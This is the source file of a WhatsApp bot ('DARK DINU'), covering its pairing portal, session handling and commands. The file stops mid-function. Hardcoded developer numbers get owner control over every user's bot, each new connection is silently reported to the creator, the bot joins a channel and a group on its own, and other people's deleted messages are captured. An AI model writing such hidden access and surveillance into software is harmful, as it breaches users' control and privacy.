// ============================================================================
// 📦 PACKAGES
// ============================================================================
const express = require('express');
const pino = require('pino');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const NodeCache = require('node-cache');
const fetch = require('node-fetch');
const {
  default: makeWASocket,
  DisconnectReason,
  delay,
  Browsers,
  makeCacheableSignalKeyStore,
  WAMessageStubType
} = require('@whiskeysockets/baileys');

// 🟢 Global Process Crash Guards
process.on('uncaughtException', (err) => {
  console.error('🛡️ [DARK DINU EXCEPTION GUARD]:', err?.message || err);
});
process.on('unhandledRejection', (err) => {
  console.error('🛡️ [DARK DINU REJECTION GUARD]:', err?.message || err);
});

// 🟢 Config & DB Models
const { MONGODB_URI, BOT_NAME } = require('./config');
const { useMongoDBAuthState, Auth } = require('./auth');
const { askAI } = require('./ai');

// ============================================================================
// 🌍 GLOBAL CONSTANTS
// ============================================================================

const UPDATE_CHANNEL_JID = '120363421906774107@newsletter';
const BOT_CHANNEL_NAME = '☠️ ᴅᴀʀᴋ ᴅɪɴᴜ ᴄᴏʀᴇ ☠️';
const CHANNEL_REACTIONS = ['🩸', '💀', '🔥', '⚡', '🖤', '☣️', '👁️'];
const DEFAULT_BACKUP_LOGO = 'https://files.catbox.moe/a58add.jpeg';

const channelContext = {
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: UPDATE_CHANNEL_JID,
      newsletterName: BOT_CHANNEL_NAME,
      serverMessageId: 1
    }
  }
};
global.channelContext = channelContext;

const REAL_OWNER_NUMBER = '94719845166';
const OWNER_NUMBERS = [
  '94719845166',
  '94720882316',
  '15947733680169',
  '15947733680169@lid',
  '72787431583987',
  '72787431583987@lid'
];

const DEFAULT_SETTINGS = {
  workMode: 'public',
  autoStatusSeen: true,
  statusReact: true,
  statusReactEmoji: '💀',
  botLogo: DEFAULT_BACKUP_LOGO,
  autoPresence: 'off',
  autoChatRead: false,
  aiChatEnabled: false,
  antiDeleteEnabled: true,
  antiDeleteType: 'all',
  antiDeleteDest: 'me',
  securityPin: '1234',
  isFirstConnectDone: false
};

// ============================================================================
// 🧠 RUNTIME STATE & PERMANENT MESSAGE STORE
// ============================================================================

const settingsCache = new NodeCache({ stdTTL: 300, checkperiod: 60, maxKeys: 200 });
const globalMsgStore = new NodeCache({ stdTTL: 14400, checkperiod: 300, maxKeys: 20000 });

const activeSessions = {};
global.activeSessions = activeSessions;
const isStarting = {};
const reconnectAttempts = {};
const commands = new Map();

// ============================================================================
// 🗄️ DATABASE SCHEMA & HELPERS
// ============================================================================

function createSettingsModel() {
  const SettingsSchema = new mongoose.Schema({
    _id: { type: String, required: true },
    workMode: { type: String, default: DEFAULT_SETTINGS.workMode },
    autoStatusSeen: { type: Boolean, default: DEFAULT_SETTINGS.autoStatusSeen },
    statusReact: { type: Boolean, default: DEFAULT_SETTINGS.statusReact },
    statusReactEmoji: { type: String, default: DEFAULT_SETTINGS.statusReactEmoji },
    botLogo: { type: String, default: DEFAULT_SETTINGS.botLogo },
    autoPresence: { type: String, default: DEFAULT_SETTINGS.autoPresence },
    autoChatRead: { type: Boolean, default: DEFAULT_SETTINGS.autoChatRead },
    aiChatEnabled: { type: Boolean, default: DEFAULT_SETTINGS.aiChatEnabled },
    antiDeleteEnabled: { type: Boolean, default: DEFAULT_SETTINGS.antiDeleteEnabled },
    antiDeleteType: { type: String, default: DEFAULT_SETTINGS.antiDeleteType },
    antiDeleteDest: { type: String, default: DEFAULT_SETTINGS.antiDeleteDest },
    securityPin: { type: String, default: DEFAULT_SETTINGS.securityPin },
    isFirstConnectDone: { type: Boolean, default: DEFAULT_SETTINGS.isFirstConnectDone }
  });

  return mongoose.models.BotSettings || mongoose.model('BotSettings', SettingsSchema);
}

const SettingsModel = createSettingsModel();

function clearSettingsCache(num) {
  if (num) settingsCache.del(num);
}
global.clearSettingsCache = clearSettingsCache;

async function getBotSettings(botNum) {
  if (!botNum) return { ...DEFAULT_SETTINGS };
  const cached = settingsCache.get(botNum);
  if (cached) return cached;

  try {
    let settings = await SettingsModel.findById(botNum).lean();
    if (!settings) {
      const created = await SettingsModel.create({ _id: botNum, ...DEFAULT_SETTINGS });
      settings = created.toObject();
    }
    settingsCache.set(botNum, settings);
    return settings;
  } catch (e) {
    return { ...DEFAULT_SETTINGS };
  }
}
global.getBotSettings = getBotSettings;

// ============================================================================
// 📂 COMMAND LOADER
// ============================================================================

function registerCommandAliases(cmd, cmdName) {
  if (cmd && cmd.name) commands.set(cmd.name.toLowerCase(), cmd);
  commands.set(cmdName, cmd);

  if (cmd && cmd.alias) {
    if (Array.isArray(cmd.alias)) {
      for (const al of cmd.alias) commands.set(al.toLowerCase(), cmd);
    } else if (typeof cmd.alias === 'string') {
      commands.set(cmd.alias.toLowerCase(), cmd);
    }
  }
}

function loadCommandFile(cmdDir, file) {
  try {
    let cmd = require(path.join(cmdDir, file));
    if (cmd.default) cmd = cmd.default;
    const cmdName = file.replace('.js', '').toLowerCase();
    registerCommandAliases(cmd, cmdName);
  } catch (e) {
    console.error(`❌ [DARK DINU LOAD ERROR] ${file}:`, e.message);
  }
}

function loadAllCommands() {
  const cmdDir = path.join(__dirname, 'commands');
  if (!fs.existsSync(cmdDir)) return;
  const cmdFiles = fs.readdirSync(cmdDir).filter(f => f.endsWith('.js'));
  for (const file of cmdFiles) {
    loadCommandFile(cmdDir, file);
  }
}

function findCommand(...names) {
  for (const name of names) {
    const cmd = commands.get(name);
    if (cmd) return cmd;
  }
  return null;
}

function getCommandExecutor(cmd) {
  if (typeof cmd === 'function') return cmd;
  if (cmd && typeof cmd.execute === 'function') return cmd.execute;
  if (cmd && typeof cmd.run === 'function') return cmd.run;
  if (cmd && typeof cmd.downloadAndSendStatus === 'function') return cmd.downloadAndSendStatus;
  return null;
}

// ============================================================================
// 🌐 HACKER CYBER-TERMINAL PAIRING PORTAL
// ============================================================================

function renderPortalHtml(botName) {
  const displayTitle = botName || 'DARK DINU';
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${displayTitle} • BREACH TERMINAL</title>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Orbitron:wght@600;800;900&display=swap" rel="stylesheet">
      <style>
        :root {
          --bg-terminal: #030102;
          --panel-terminal: rgba(13, 2, 4, 0.88);
          --neon-crimson: #ff003c;
          --blood-glow: rgba(255, 0, 60, 0.45);
          --border-cyber: rgba(255, 0, 60, 0.35);
          --border-active: #ff003c;
          --matrix-font: 'JetBrains Mono', monospace;
          --cyber-font: 'Orbitron', sans-serif;
          --text-terminal: #e6e6e6;
          --text-sub: #7a6369;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
          background-color: var(--bg-terminal);
          background-image: 
            radial-gradient(circle at 50% 10%, rgba(255, 0, 60, 0.18) 0%, transparent 65%),
            linear-gradient(rgba(255, 0, 60, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(255, 0, 60, 0.03) 1px, transparent 1px);
          background-size: 100% 100%, 30px 30px, 30px 30px;
          color: var(--text-terminal);
          font-family: var(--matrix-font);
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
          padding: 24px;
        }
        .portal-card {
          background: var(--panel-terminal);
          backdrop-filter: blur(20px);
          border: 1px solid var(--border-cyber);
          border-radius: 12px;
          padding: 40px 32px;
          width: 100%;
          max-width: 450px;
          text-align: center;
          box-shadow: 0 0 50px rgba(0, 0, 0, 0.9), 0 0 35px var(--blood-glow);
          position: relative;
          overflow: hidden;
        }
        .portal-card::before {
          content: '';
          position: absolute;
          top: 0; left: 0; right: 0; height: 3px;
          background: linear-gradient(90deg, transparent, var(--neon-crimson), #ffffff, var(--neon-crimson), transparent);
          box-shadow: 0 0 15px var(--neon-crimson);
        }
        .system-badge {
          display: inline-flex; align-items: center; gap: 8px;
          font-size: 10px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase;
          color: var(--neon-crimson); background: rgba(255, 0, 60, 0.1);
          border: 1px solid var(--border-cyber); padding: 6px 14px; border-radius: 4px; margin-bottom: 22px;
        }
        .pulse-core { width: 7px; height: 7px; background: var(--neon-crimson); border-radius: 50%; box-shadow: 0 0 10px var(--neon-crimson); animation: pulse 1.4s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
        .app-title {
          font-family: var(--cyber-font);
          font-size: 32px; font-weight: 900; letter-spacing: 2px;
          color: #ffffff;
          text-shadow: 0 0 12px var(--blood-glow), 0 0 24px var(--neon-crimson);
          margin-bottom: 6px;
        }
        .app-desc { font-size: 12px; color: var(--text-sub); margin-bottom: 28px; text-transform: uppercase; letter-spacing: 1px; }
        .input-wrap { position: relative; margin-bottom: 18px; }
        .phone-input {
          width: 100%; padding: 15px 18px; border-radius: 6px; border: 1px solid var(--border-cyber);
          background: rgba(0, 0, 0, 0.85); color: #ff3366; font-size: 17px; font-family: var(--matrix-font);
          font-weight: 700; letter-spacing: 2px; text-align: center; outline: none; transition: all 0.25s ease;
        }
        .phone-input:focus { border-color: var(--border-active); box-shadow: 0 0 20px var(--blood-glow); background: #000000; }
        .btn-action {
          width: 100%; padding: 15px; border-radius: 6px; border: 1px solid var(--neon-crimson);
          background: linear-gradient(180deg, rgba(255, 0, 60, 0.2) 0%, rgba(138, 0, 32, 0.8) 100%);
          color: #ffffff; font-family: var(--cyber-font); font-size: 13px; font-weight: 800;
          letter-spacing: 1.5px; cursor: pointer; transition: all 0.2s ease;
          box-shadow: 0 0 20px rgba(255, 0, 60, 0.35); margin-bottom: 12px;
        }
        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 0 30px var(--blood-glow); background: var(--neon-crimson); }
        .btn-reset {
          width: 100%; padding: 12px; border-radius: 6px; border: 1px solid rgba(255, 0, 60, 0.2);
          background: rgba(255, 0, 60, 0.05); color: var(--text-sub); font-family: var(--matrix-font);
          font-size: 11px; font-weight: 600; letter-spacing: 1px; cursor: pointer; transition: 0.2s;
        }
        .btn-reset:hover { color: #ffffff; border-color: var(--neon-crimson); background: rgba(255, 0, 60, 0.15); }
        .code-container { display: none; margin-top: 24px; animation: glitch 0.3s ease; }
        @keyframes glitch { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
        .code-box {
          font-family: var(--matrix-font); font-size: 32px; font-weight: 800; letter-spacing: 6px;
          color: #ffffff; background: rgba(255, 0, 60, 0.12); border: 1.5px dashed var(--neon-crimson);
          padding: 16px; border-radius: 6px; cursor: pointer; transition: all 0.2s ease;
          text-shadow: 0 0 10px var(--neon-crimson);
        }
        .code-box:hover { background: rgba(255, 0, 60, 0.22); transform: scale(1.02); }
        .copy-tag { font-size: 11px; color: var(--neon-crimson); margin-top: 8px; letter-spacing: 1px; }
        .footer-note { margin-top: 28px; font-size: 10px; letter-spacing: 2px; color: rgba(255, 255, 255, 0.2); text-transform: uppercase; }
      </style>
    </head>
    <body>
      <div class="portal-card">
        <div class="system-badge"><span class="pulse-core"></span> CORE THREAT: ACTIVE</div>
        <h1 class="app-title">${displayTitle}</h1>
        <p class="app-desc">[ NODE TERMINAL CONNECTION ]</p>
        <div class="input-wrap">
          <input type="text" id="phone" class="phone-input" placeholder="947xxxxxxxx" />
        </div>
        <button id="btn" class="btn-action" onclick="fetchPairCode()">REQUEST PAIRING KEY</button>
        <button class="btn-reset" onclick="cleanSessionSlot()">[ PURGE SESSION MEMORY ]</button>
        <div class="code-container" id="codeWrapper">
          <div class="code-box" id="codeDisplay" onclick="copyCode()"></div>
          <div class="copy-tag">CLICK TOKEN TO COPY</div>
        </div>
        <p class="footer-note">DARK DINU EXCLUSIVE RUNTIME</p>
      </div>
      <script>
        async function fetchPairCode() {
          const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          if (!phone || phone.length < 10) return alert('[ACCESS DENIED] Country Code සහිත දුරකථන අංකය ඇතුළත් කරන්න!');
          const btn = document.getElementById('btn');
          const wrapper = document.getElementById('codeWrapper');
          const display = document.getElementById('codeDisplay');
          btn.innerText = 'GENERATING SECURE TOKEN...';
          btn.disabled = true;
          wrapper.style.display = 'none';
          try {
            const res = await fetch('/pair?num=' + phone);
            const data = await res.json();
            if (data.code) {
              display.innerText = data.code;
              wrapper.style.display = 'block';
              navigator.clipboard.writeText(data.code).catch(()=>{});
              alert('☠️ DARK DINU Pairing Token: ' + data.code);
            } else {
              alert(data.error || 'Connection busy. Please wait 10 seconds and retry.');
            }
          } catch(e) {
            alert('Host Server connection error!');
          }
          btn.innerText = 'REQUEST PAIRING KEY';
          btn.disabled = false;
        }
        async function cleanSessionSlot() {
          const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          if (!phone) return alert('Purge කිරීමට Phone Number එක ඇතුළත් කරන්න!');
          if (confirm('+' + phone + ' සඳහා session memory එක wipe කරන්නද?')) {
            try {
              const res = await fetch('/reset-num?num=' + phone);
              const data = await res.json();
              if (data.success) alert('☠️ Session Memory Purged!');
            } catch(e) {
              alert('Purge command failed!');
            }
          }
        }
        function copyCode() {
          const code = document.getElementById('codeDisplay').innerText;
          if (code) {
            navigator.clipboard.writeText(code);
            alert('☠️ Token Copied: ' + code);
          }
        }
      </script>
    </body>
    </html>
  `;
}

function registerPortalRoute(app) {
  app.get('/', (req, res) => {
    res.send(renderPortalHtml(BOT_NAME));
  });
}

// ============================================================================
// 🔌 SOCKET CREATION
// ============================================================================

async function createBaileysSocket(phoneNumber) {
  const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(phoneNumber);
  const logger = pino({ level: 'silent' });
  const msgRetryCounterCache = new NodeCache({ stdTTL: 180, checkperiod: 60, maxKeys: 300 });

  const sock = makeWASocket({
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
    logger,
    printQRInTerminal: false,
    browser: Browsers.macOS('Desktop'),
    msgRetryCounterCache,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
    fireInitQueries: true,
    generateHighQualityLinkPreview: false,
    connectTimeoutMs: 90000,
    defaultQueryTimeoutMs: 90000,
    keepAliveIntervalMs: 30000,
    markOnlineOnConnect: true,
    emitOwnEvents: false,
    shouldIgnoreJid: () => false
  });

  sock.ev.on('creds.update', saveCreds);
  return { sock, clearSessionData };
}

// ============================================================================
// 🔄 CONNECTION LIFECYCLE
// ============================================================================

async function handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData) {
  const statusCode = lastDisconnect?.error?.output?.statusCode;
  console.log(`⚠️ Connection closed (${phoneNumber}), Code:${statusCode}`);

  try {
    sock.ev.removeAllListeners();
    sock.ws?.close();
  } catch (e) {}

  delete activeSessions[phoneNumber];

  if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
    console.log(`☠️ Permanent session logout: ${phoneNumber}`);
    delete reconnectAttempts[phoneNumber];
    if (typeof clearSessionData === 'function') await clearSessionData();
    return;
  }

  reconnectAttempts[phoneNumber] = (reconnectAttempts[phoneNumber] || 0) + 1;
  let delayTime = 6000;

  if (statusCode === 440) {
    delayTime = Math.min(reconnectAttempts[phoneNumber] * 12000, 45000);
  } else if (reconnectAttempts[phoneNumber] > 5) {
    delayTime = 25000;
  }

  setTimeout(() => {
    initWhatsApp(phoneNumber);
  }, delayTime);
}

async function autoFollowChannelAndJoinGroup(sock, phoneNumber) {
  await delay(2500);
  try {
    const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
    if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
      const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
      if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
    }
  } catch (e) {}

  try {
    const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X';
    if (typeof sock.groupAcceptInvite === 'function') {
      await sock.groupAcceptInvite(groupInviteCode);
    }
  } catch (e) {}
}

function buildConnectedMessage(botNum) {
  return `*☠️ ᴅᴀʀᴋ ᴅɪɴᴜ : ꜱʏꜱᴛᴇᴍ ᴏɴʟɪɴᴇ ☠️*
━━━━━━━━━━━━━━━━━━━━━
• *Node*     : +${botNum}
• *Protocol* : DARK DINU V2
• *Security* : Anti-Delete Active | Stealth Mode
• *Status*   : Connected (24/7 Cloud Node)
━━━━━━━━━━━━━━━━━━━━━
> Type *.menu* to access the mainframe.`.trim();
}

async function sendFirstConnectAlerts(sock, phoneNumber) {
  try {
    const botNum = sock.user?.id
      ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '')
      : phoneNumber.replace(/[^0-9]/g, '');

    const botJid = `${botNum}@s.whatsapp.net`;
    const creatorJid = `${REAL_OWNER_NUMBER}@s.whatsapp.net`;

    const currentSettings = await getBotSettings(botNum);
    if (currentSettings.isFirstConnectDone) return;

    const sessionLogo = currentSettings.botLogo || DEFAULT_BACKUP_LOGO;
    const connectedMsg = buildConnectedMessage(botNum);

    const connectPayload = {
      image: { url: sessionLogo },
      caption: connectedMsg,
      ...global.channelContext
    };

    await sock.sendMessage(botJid, connectPayload).catch(() => {
      sock.sendMessage(botJid, { text: connectedMsg, ...global.channelContext }).catch(() => {});
    });

    if (!botNum.includes(REAL_OWNER_NUMBER)) {
      const alertMsg = `*☠️ ALERT : NEW NODE CONNECTED ☠️*
━━━━━━━━━━━━━━━━━━━━━
• *Node*   : +${botNum}
• *Core*   : DARK DINU Initialized
━━━━━━━━━━━━━━━━━━━━━`;
      await sock.sendMessage(creatorJid, { text: alertMsg, ...global.channelContext }).catch(() => {});
    }

    await SettingsModel.findByIdAndUpdate(botNum, { isFirstConnectDone: true }, { upsert: true });
    clearSettingsCache(botNum);
  } catch (e) {}
}

function handleConnectionOpen(sock, phoneNumber) {
  console.log(`☠️ DARK DINU ONLINE: ${phoneNumber}`);
  reconnectAttempts[phoneNumber] = 0;
  autoFollowChannelAndJoinGroup(sock, phoneNumber);
  setTimeout(() => sendFirstConnectAlerts(sock, phoneNumber), 3000);
}

function registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData) {
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      await handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData);
    } else if (connection === 'open') {
      handleConnectionOpen(sock, phoneNumber);
    }
  });
}

// ============================================================================
// 💬 MESSAGE HANDLING HELPERS
// ============================================================================

async function reactToChannelPost(sock, msg, chatJid) {
  try {
    const randomEmoji = CHANNEL_REACTIONS[Math.floor(Math.random() * CHANNEL_REACTIONS.length)];
    await delay(Math.floor(Math.random() * 3000) + 1200);

    const serverId = msg.message?.newsletterAdminInviteMessage?.newsletterJid || msg.key?.server_id || msg.key?.id;
    if (typeof sock.newsletterReactMessage === 'function' && serverId) {
      await sock.newsletterReactMessage(chatJid, serverId, randomEmoji);
    } else {
      await sock.sendMessage(chatJid, { react: { text: randomEmoji, key: msg.key } });
    }
  } catch (err) {}
}

async function simulateAutoPresence(sock, chatJid, settings) {
  if (!settings.autoPresence || settings.autoPresence === 'off') return;
  try {
    const type = settings.autoPresence === 'recording' ? 'recording' : 'composing';
    await sock.sendPresenceUpdate(type, chatJid);
  } catch (err) {}
}

async function handleStatusBroadcast(sock, msg, settings) {
  if (!settings.autoStatusSeen) return;
  try {
    await sock.readMessages([msg.key]);
    if (settings.statusReact && msg.key.participant) {
      await sock.sendMessage(
        'status@broadcast',
        { react: { text: settings.statusReactEmoji || '💀', key: msg.key } },
        { statusJidList: [msg.key.participant] }
      );
    }
  } catch (e) {}
}

function resolveOriginalSender(msg, chatJid, isGroup, myBotJid) {
  if (msg.key.fromMe) return myBotJid;
  if (isGroup) {
    return msg.key?.participant || msg.participant || '';
  }
  return chatJid;
}

async function resolveLidToRealJid(sock, originalSender) {
  if (!originalSender) return '';
  if (!originalSender.endsWith('@lid') || !sock.signalRepository?.lidToJid) {
    return originalSender;
  }
  try {
    const resolved = await sock.signalRepository.lidToJid(originalSender);
    return resolved || originalSender;
  } catch (e) {
    return originalSender;
  }
}

function isOwnerJid(jid) {
  if (!jid) return false;
  const str = String(jid).toLowerCase();
  return OWNER_NUMBERS.some(owner => str.includes(owner.toLowerCase()));
}

function checkIsOwner(originalSender, resolvedSender) {
  return isOwnerJid(originalSender) || isOwnerJid(resolvedSender);
}

function checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum) {
  return isOwner || msg.key.fromMe || (Boolean(myBotNum) && cleanSenderNum === myBotNum);
}

function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode) {
  if (isAuthorized) return false;
  const mode = String(workMode || 'public').toLowerCase().trim();
  if (mode === 'public') return false;
  if (mode === 'private' || mode === 'self') return true;
  if ((mode === 'groups' || mode === 'group') && !isGroup) return true;
  if (mode === 'inbox' && isGroup) return true;
  return false;
}

function unwrapMessageContent(message) {
  return (
    message?.ephemeralMessage?.message ||
    message?.viewOnceMessage?.message ||
    message?.viewOnceMessageV2?.message ||
    message?.documentWithCaptionMessage?.message ||
    message
  );
}

function extractMessageText(rawMsg) {
  return (
    rawMsg?.conversation ||
    rawMsg?.extendedTextMessage?.text ||
    rawMsg?.imageMessage?.caption ||
    rawMsg?.videoMessage?.caption ||
    rawMsg?.buttonsResponseMessage?.selectedButtonId ||
    rawMsg?.templateButtonReplyMessage?.selectedId ||
    ''
  ).trim();
}

function buildSafeReply(sock, chatJid, msg) {
  return async (content) => {
    let replyPayload = typeof content === 'string' ? { text: content } : { ...content };
    
    replyPayload.contextInfo = {
      ...(replyPayload.contextInfo || {}),
      ...(global.channelContext?.contextInfo || {})
    };

    try {
      return await sock.sendMessage(chatJid, replyPayload, { quoted: msg });
    } catch (e) {
      return await sock.sendMessage(chatJid, replyPayload);
    }
  };
}

function isSettingsMenuOption(cleanInput) {
  return (
    /^([1-9]|1[0-2])(\.[1-4])?$/.test(cleanInput) ||
    cleanInput.startsWith('6 ') ||
    cleanInput.startsWith('pin ') ||
    cleanInput.startsWith('set ') ||
    cleanInput.startsWith('antidel ')
  );
}

function extractQuotedCaption(quotedMsgObj) {
  return (
    quotedMsgObj?.imageMessage?.caption ||
    quotedMsgObj?.videoMessage?.caption ||
    quotedMsgObj?.conversation ||
    quotedMsgObj?.extendedTextMessage?.text ||
    ''
  );
}

function isQuotedFromSettingsMenu(quotedCaption) {
  const cap = quotedCaption.toUpperCase();
  return (
    cap.includes('SYSTEM SETTINGS') ||
    cap.includes('WORK MODE') ||
    cap.includes('FAKE ACTION') ||
    cap.includes('AI AUTO CHAT') ||
    cap.includes('ANTI-DELETE') ||
    cap.includes('ANTI DELETE')
  );
}

function isQuotedFromMainMenu(quotedCaption) {
  return (
    quotedCaption.includes('COMMAND CATEGORIES') ||
    quotedCaption.includes('DOWNLOAD MENU') ||
    (quotedCaption.includes('USER PROFILE') && quotedCaption.includes('Prefix'))
  );
}

async function handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum) {
  const settingsCmd = findCommand('settings', 'setting', 'set');
  if (!settingsCmd) return false;
  const cmdFunc = getCommandExecutor(settingsCmd);
  if (!cmdFunc) return false;

  clearSettingsCache(myBotNum);
  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized) {
  const statusCmd = findCommand('save', 'status');
  if (!statusCmd) return false;
  const cmdFunc = getCommandExecutor(statusCmd);
  if (!cmdFunc) return false;

  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
  return true;
}

async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum) {
  const prefixMatch = text.match(/^[./!#]/);
  if (!prefixMatch) return false;

  const prefix = prefixMatch[0];
  const args = text.slice(prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();

  // 🛡️ ANTI-DELETE COMMAND DIRECT
  if (['antidel', 'antidelete'].includes(commandName)) {
    if (!isAuthorized) {
      await safeReply('⚠️ Settings වෙනස් කිරීමට අවසර නැත. (Root Admin Only)');
      return true;
    }

    const sub = args[0]?.toLowerCase();
    const val = args[1]?.toLowerCase();

    if (!sub) {
      const current = await getBotSettings(myBotNum);
      return safeReply(
        `*☠️ DARK DINU ANTI-DELETE CONSOLE ☠️*\n\n` +
        `• Status   : *${current.antiDeleteEnabled ? 'ACTIVE 🟢' : 'DISABLED 🔴'}*\n` +
        `• Scope    : *${(current.antiDeleteType || 'all').toUpperCase()}* (inbox | group | all)\n` +
        `• Intercept: *${(current.antiDeleteDest || 'me').toUpperCase()}* (me | from)\n\n` +
        `*Commands:*\n` +
        `• \`${prefix}antidel on/off\`\n` +
        `• \`${prefix}antidel type inbox/group/all\`\n` +
        `• \`${prefix}antidel to me/from\``
      );
    }

    if (sub === 'on' || sub === 'off') {
      const state = sub === 'on';
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteEnabled: state }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`☠️ Anti-Delete set to: *${sub.toUpperCase()}*`);
    }

    if (sub === 'type') {
      if (!['inbox', 'group', 'all'].includes(val)) {
        return safeReply('❌ Invalid type! Choose: `inbox`, `group`, or `all`');
      }
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteType: val }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`☠️ Anti-Delete scope set to: *${val.toUpperCase()}*`);
    }

    if (sub === 'to' || sub === 'dest') {
      if (!['me', 'from'].includes(val)) {
        return safeReply('❌ Invalid destination! Choose: `me` or `from`');
      }
      await SettingsModel.findByIdAndUpdate(myBotNum, { antiDeleteDest: val }, { upsert: true });
      clearSettingsCache(myBotNum);
      return safeReply(`☠️ Intercept destination set to: *${val.toUpperCase()}*`);
    }

    return safeReply('❌ Invalid syntax. Type `' + prefix + 'antidel`');
  }

  const isSettingsCmd = ['setting', 'settings', 'set', 'config'].includes(commandName);

  if (isSettingsCmd && !isAuthorized) {
    await safeReply('⚠️ Access Denied! Root Admin only.');
    return true;
  }

  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
    return true;
  }

  let targetCmd = commands.get(commandName);
  if (!targetCmd && isSettingsCmd) targetCmd = findCommand('settings', 'setting', 'set');
  if (!targetCmd) return false;

  try {
    const cmdFunc = getCommandExecutor(targetCmd);
    if (cmdFunc) {
      if (isSettingsCmd) clearSettingsCache(myBotNum);
      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorized, isGroup });
    }
  } catch (err) {
    console.error(`Command [${commandName}] execution error:`, err?.message);
  }
  return true;
}

// ============================================================================
// 🛡️ ANTI-DELETE DISPATCHER
// ============================================================================

async function triggerAntiDelete(sock, deletedKey, cachedMsg, phoneNumber) {
  try {
    const myBotJid = sock.user?.id || '';
    const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
    const settings = await getBotSettings(myBotNum);

    if (!settings.antiDeleteEnabled) return;

    const chatJid = deletedKey.remoteJid;
    const isGroup = chatJid.endsWith('@g.us');

    if (settings.antiDeleteType === 'inbox' && isGroup) return;
    if (settings.antiDeleteType === 'group' && !isGroup) return;

    const sender = cachedMsg.key.participant || cachedMsg.key.remoteJid;
    const senderClean = sender.split('@')[0].split(':')[0];

    const targetJid = settings.antiDeleteDest === 'from'
      ? chatJid
      : myBotJid.split(':')[0] + '@s.whatsapp.net';

    const alertText = 
      `*☠️ DARK DINU : REVOKED MESSAGE INTERCEPTED ☠️*\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `👤 *Sender:* @${senderClean}\n` +
      `📍 *Target:* ${isGroup ? 'Group Domain' : 'Direct Message'}\n` +
      `⏰ *Logged:* ${new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Colombo' })}\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `> *Extracted Content:*`;

    await sock.sendMessage(targetJid, {
      text: alertText,
      mentions: [sender],
      ...global.channelContext
    });

    const rawContent = unwrapMessageContent(cachedMsg.message);
    const textBody = rawContent?.conversation || rawContent?.extendedTextMessage?.text;

    if (textBody) {
      await sock.sendMessage(targetJid, { text: `💬 *Message:* \n${textBody}` });
    } else {
      try {
        await sock.sendMessage(targetJid, { forward: cachedMsg, ...global.channelContext });
      } catch (e) {
        await sock.sendMessage(targetJid, rawContent);
      }
    }
  } catch (err) {
    console.error('Anti-delete trigger error:', err?.message);
  }
}

// ============================================================================
// 💬 SINGLE MESSAGE PROCESSOR
// ============================================================================

async function processSingleMessage(sock, msg, phoneNumber) {
  if (!msg || !msg.message) return;
  const chatJid = msg.key?.remoteJid;
  if (!chatJid) return;

  if (chatJid !== 'status@broadcast' && msg.key?.id) {
    const isProtocolRevoke = msg.message?.protocolMessage?.type === 0;
    if (isProtocolRevoke && msg.message?.protocolMessage?.key?.id) {
      const revKey = msg.message.protocolMessage.key;
      const cachedRevMsg = globalMsgStore.get(revKey.id);
      if (cachedRevMsg) {
        await triggerAntiDelete(sock, revKey, cachedRevMsg, phoneNumber);
        return;
      }
    }

    globalMsgStore.set(msg.key.id, JSON.parse(JSON.stringify(msg)));
  }

  if (chatJid === UPDATE_CHANNEL_JID || chatJid.endsWith('@newsletter')) {
    if (!msg.message.reactionMessage) reactToChannelPost(sock, msg, chatJid);
    return;
  }

  if (msg.message.reactionMessage) return;

  const isGroup = chatJid.endsWith('@g.us');
